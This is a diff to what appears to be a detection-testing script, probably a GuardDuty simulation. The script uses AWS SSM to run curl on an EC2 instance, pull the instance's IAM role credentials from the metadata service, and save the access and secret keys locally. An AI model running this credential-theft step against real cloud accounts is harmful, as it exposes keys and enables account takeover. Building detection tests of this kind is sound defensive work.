@@ -18,7 +18,24 @@ code=$(gd_canary_flow)
 gd_log inject_start flujo "$code"
 
 instance=$(aws ec2 describe-instances --region "$region" --filters Name=tag:Name,Values="${INSTANCE_NAME:-pokenetes-api-stable}" Name=instance-state-name,Values=running --query "Reservations[0].Instances[0].InstanceId" --output text)
-cmd=$(aws ssm send-command --region "$region" --instance-ids "$instance" --document-name AWS-RunShellScript --parameters commands="TOKEN=\$(curl -s -X PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 300'); curl -s -H \"X-aws-ec2-metadata-token: \$TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/${role}" --query Command.CommandId --output text)
+params="$GD_EVIDENCE/.ssm-params.json"
+ROLE_NAME="$role" python - "$params" <<'PY'
+import json, os, sys
+role = os.environ["ROLE_NAME"]
+script = (
+    "TOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token "
+    "-H 'X-aws-ec2-metadata-token-ttl-seconds: 300'); "
+    "curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" "
+    f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}"
+)
+json.dump({"commands": [script]}, open(sys.argv[1], "w", encoding="utf-8"))
+PY
+winparams="$params"
+if command -v cygpath >/dev/null 2>&1; then
+  winparams=$(cygpath -m "$params")
+fi
+cmd=$(aws ssm send-command --region "$region" --instance-ids "$instance" --document-name AWS-RunShellScript --parameters "file://${winparams}" --query Command.CommandId --output text)
+rm -f "$params"
 for _ in 1 2 3 4 5 6 7 8 9 10; do
   sleep 3
   status=$(aws ssm get-command-invocation --region "$region" --command-id "$cmd" --instance-id "$instance" --query Status --output text 2>/dev/null || echo Pending)
@@ -31,7 +48,8 @@ printf '%s' "$raw" >"$creds"
 unset raw
 python - "$creds" <<'PY'
 import json, sys
-data = json.load(open(sys.argv[1], encoding="utf-8"))
+raw = open(sys.argv[1], encoding="utf-8").read()
+data = json.loads(raw[raw.find("{") :])
 base = sys.argv[1]
 open(base + ".ak", "w", encoding="utf-8").write(data["AccessKeyId"])
 open(base + ".sk", "w", encoding="utf-8").write(data["SecretAccessKey"])
